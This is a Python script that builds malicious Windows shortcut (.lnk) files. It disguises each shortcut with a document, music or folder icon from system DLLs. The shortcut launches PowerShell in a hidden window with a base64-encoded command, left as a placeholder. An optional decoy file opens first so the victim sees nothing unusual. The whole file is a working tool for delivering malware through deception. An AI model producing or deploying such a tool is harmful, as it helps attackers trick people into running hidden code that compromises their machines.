import os
import argparse
import win32com.client

def create_shortcut(output_path, target_path, arguments, icon_location):
    try:
        shell = win32com.client.Dispatch('WScript.Shell')
        shortcut = shell.CreateShortcut(output_path)
        shortcut.TargetPath = target_path
        shortcut.Arguments = arguments
        shortcut.IconLocation = icon_location
        shortcut.Save()
        print(f"LNK Shortcut created at: {output_path}")
    except Exception as e:
        print(f"Error creating shortcut: {e}")

def main():
    parser = argparse.ArgumentParser(description="LNK creator with icon and decoy options.")
    parser.add_argument("-o", "--output", required=True, help="Path to save the output .lnk file.")
    parser.add_argument("-i", "--icon", required=True, choices=["mp3", "docx", "xls", "txt", "folder"], help="Icon type to use (mp3, docx, xls, txt, folder).")
    parser.add_argument("-d", "--decoy", help="Path to a decoy file to open before running the main command.")
    parser.add_argument("--debug", action="store_true", help="Enable debugging output.")
    args = parser.parse_args()

    icon_map = {
        "mp3": ("%SystemRoot%\\system32\\wmploc.dll", 49),
        "docx": ("%SystemRoot%\\system32\\imageres.dll", 340),
        "xls": ("%SystemRoot%\\system32\\imageres.dll", 358),
        "txt": ("%SystemRoot%\\system32\\shell32.dll", 70),
        "folder": ("%SystemRoot%\\system32\\imageres.dll", 4)
    }
    icon_path, icon_index = icon_map.get(args.icon, icon_map["folder"])
    icon_path = os.path.expandvars(icon_path)

    encoded_command = "YOUR_BASE64_COMMAND"
    ps_target = os.path.expandvars("%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe")

    if args.decoy:
        decoy_filename = os.path.basename(args.decoy)
        decoy_command = f"Start-Process {decoy_filename}"
        main_command = f'powershell -WindowStyle Hidden -EncodedCommand {encoded_command}'
        ps_arguments = f'-WindowStyle Hidden -Command "{decoy_command}; {main_command}"'
    else:
        ps_arguments = f'-WindowStyle Hidden -EncodedCommand {encoded_command}'

    if args.debug:
        print("--- DEBUGGING ---")
        print(f"Output Path: {args.output}")
        print(f"Target Path: {ps_target}")
        print(f"Arguments: {ps_arguments}")
        print(f"Icon Location: {icon_path},{icon_index}")
        print(f"Full Command: {ps_target} {ps_arguments}")
        print("-----------------")

    create_shortcut(args.output, ps_target, ps_arguments, f"{icon_path},{icon_index}")

if __name__ == '__main__':
    main()